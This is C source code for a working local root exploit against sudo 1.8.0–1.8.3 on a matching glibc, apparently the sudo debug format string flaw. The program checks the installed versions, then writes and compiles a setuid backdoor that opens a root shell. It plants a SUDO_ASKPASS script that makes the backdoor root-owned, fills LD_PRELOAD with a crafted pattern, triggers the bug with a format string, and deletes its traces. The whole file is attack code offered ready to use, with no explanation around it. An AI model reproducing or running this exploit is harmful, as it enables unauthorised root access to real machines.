#include <sys/resource.h>
#include <sys/utsname.h>
#include <gnu/libc-version.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <string.h>
#include <sys/wait.h>

#define OFFSET       65000
#define NUM_THREADS  0

/* files that we create on disk */
#define BACKDOOR     "e.c"
#define BD_COMPILED  "e"
#define SUDO_ASKPASS "e.sh"

extern char **environ;
struct utsname ver;

void *kill_sudo();
void *pop_shell();
void *set_env();
int is_glibc_vuln();
int is_sudo_vuln();
int write_backdoor();

/* hardcoded path to sudo */
const char sudo[] = "/usr/bin/sudo\0";
char s_version[20];

/* vuln versions of sudo */
char vuln_sudo_versions[4][20] = {
    {"1.8.0"},
    {"1.8.1"},
    {"1.8.2"},
    {"1.8.3"}
};

/* vuln versions of glibc */
char vuln_glibc_versions[4][20] = {
    {"2.14.90"},
};

int main(int argc, char *argv[])
{
    struct rlimit rara;
    int status;
    char ready;
    uname(&ver);
    printf("[+] Targeting release: %s\n", ver.release);
    if (is_glibc_vuln()){
        if(is_sudo_vuln()){
            if (write_backdoor()){
                printf("[+] Press enter when ready...");
                scanf("%c", &ready);
            }else{ exit(0); }
        }else{ exit(0); }
    }else{ exit(0); }

    // ulimited stack
    rara.rlim_max = rara.rlim_cur = -1;
    setrlimit(RLIMIT_STACK, &rara);

    pid_t pid;
    if((pid = fork()) < 0)
    {
        printf("[-] An error occurred while forking sudo\n");
        return -1;
    }
    else if(pid == 0){
        set_env();
        kill_sudo();
    }else{
        wait(&status);
        if (WIFEXITED(status)) {
            sleep(1);
            pop_shell();
        }
    }
}

int is_glibc_vuln(){
    int i, returnval = -1;
    for (i = 0; i < 4; i++){
        if (strcmp(gnu_get_libc_version(), vuln_glibc_versions[i]) == 0){
            printf("[+] Found vuln glibc version: %s\n", gnu_get_libc_version());
            returnval = 1;
        }
    }
    return returnval;
};

int is_sudo_vuln(){
    int i, returnval = -1;;
    FILE *fp;
    char path[20];
    char sudo_ver_cmd[50];
    snprintf(sudo_ver_cmd, sizeof(sudo)+3,"%s -V", sudo);
    fp = popen(sudo_ver_cmd, "r");

    if (fp == NULL) {
        printf("[-] Failed to get sudo's version\n[-]Exiting.." );
        exit(0);
    }
    fgets(path, 21, fp);
    memmove (s_version, path+13,5);
    for (i = 0; i < 4; i++){
        if (strcmp(s_version, vuln_sudo_versions[i]) == 0){
            printf("[+] Found a vuln sudo version: %s\n", s_version);
            returnval = 1;
        }
    }
    return returnval;
};

int write_backdoor(){
    int returnval = 1;
    char askpass[100], compile_bd[100];
    char bdcode[] = "#include <stdio.h>\r\n"
                    "#include <stdlib.h>\r\n"
                    "int main(int argc, char **argv){\r\n"
                    "    printf(\"[+] Getting root..!\\n\");\r\n"
                    "    setresuid(0,0,0);\r\n"
                    "    printf(\"[+] Cleaning system.\\n\");\r\n"
                    "    remove(\"e\"); remove(\"e.c\"); remove(\"e.sh\");\r\n"
                    "    printf(\"[+] Launching root shell!\\n\");\r\n"
                    "    system(\"/bin/sh\");\r\n"
                    "    exit(0);\r\n"
                    "}\r\n";

    FILE *fp = fopen(BACKDOOR,"wb");
    if (fp == NULL) {
        printf("[-] Failed to write backdoor on the target, check your permissions\n" );
        returnval = -1;
    }else{
        printf("[+] Writing backdoor: %s\n", BACKDOOR);
    }

    fwrite(bdcode, 1, sizeof(bdcode)-1, fp); fclose(fp);
    memset(compile_bd, 0x00, sizeof(compile_bd));
    snprintf(compile_bd, sizeof(BACKDOOR)+sizeof(BD_COMPILED)+17,"/usr/bin/gcc %s -o %s", BACKDOOR, BD_COMPILED);
    printf("[+] Compiling backdoor: %s\n", BD_COMPILED);
    fp = popen(compile_bd, "r");

    if (fp == NULL) {
        printf("[-] Failed to compile the backdoor, check the gcc path\n" );
        returnval = -1;
    }

    fclose(fp);
    memset(askpass, 0x00, sizeof(askpass));
    snprintf(askpass, sizeof(BD_COMPILED)*2+39,"#!/bin/sh\nchown root:root %s\nchmod 4777 %s\n", BD_COMPILED, BD_COMPILED);
    fp = fopen(SUDO_ASKPASS,"w");

    if (fp == NULL) {
        printf("[-] Failed to write backdoor on the target, check your permissions\n" );
        returnval = -1;
    }else{
        printf("[+] Writing SUDO_ASKPASS file: %s\n", SUDO_ASKPASS);
    }

    fwrite(askpass, 1, sizeof(askpass)-1, fp); fclose(fp);
    chmod(SUDO_ASKPASS, 0755);
    return returnval;
};

void *set_env(){
    int i = 0;
    char ld_preload_evar[OFFSET] = "LD_PRELOAD=";
    char user_details[OFFSET] = {0x1f, 0x46, 0x01, 0x40};
    char sudo_askpass_evar[40];
    for (i=0; i<(OFFSET/4); i++){
        memcpy(user_details+(i*4), user_details, sizeof(int));
    }

    memmove (ld_preload_evar+11, user_details , sizeof(user_details));
    memset(sudo_askpass_evar, 0x00, sizeof(sudo_askpass_evar));
    snprintf(sudo_askpass_evar, sizeof(SUDO_ASKPASS)+13,"SUDO_ASKPASS=%s", SUDO_ASKPASS);

    // set our environment
    putenv(ld_preload_evar);
    putenv(sudo_askpass_evar);
};

void *kill_sudo(){
    char fmtstring[] = "%20$08n %*482$ %*2850$ %1073741824$";
    char *args[] = { fmtstring, "-D9", "-A", "", NULL};

    // trigger the vuln
    execve(sudo, args, environ);
};

void *pop_shell(){
    // set our environment
    unsetenv("LD_PRELOAD");
    unsetenv("SUDO_ASKPASS");
    char *exploit_args[] = { BD_COMPILED, NULL };
    execve(BD_COMPILED, exploit_args, environ);
};